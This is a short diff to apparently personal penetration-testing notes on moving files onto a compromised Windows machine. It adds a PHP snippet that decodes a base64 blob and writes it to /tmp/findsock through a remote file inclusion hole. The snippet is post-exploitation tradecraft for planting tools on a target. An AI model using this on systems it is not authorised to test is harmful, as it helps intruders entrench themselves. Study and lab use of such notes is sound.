@@ -11,9 +11,10 @@ header:
 Tranfer files to the target machine is particularly useful when we have already had a reverse shell on Windows. Windows does not have convenient commands to download files such as wget in Linux.
 
 ## If PHP RFI is available
-Use PHP base64_decode
+We first encode the file using this online tool https://www.base64encode.org/, and then use PHP base64_decode to decode and write the content into the wanted location:
 ```php
 <?php
+$encoded = 'PUT_BASE64_ENCODED_FILE_HERE';
 $file = '/tmp/findsock';
 $fp = fopen($file, 'wb');
 fwrite($fp, base64_decode($encoded));
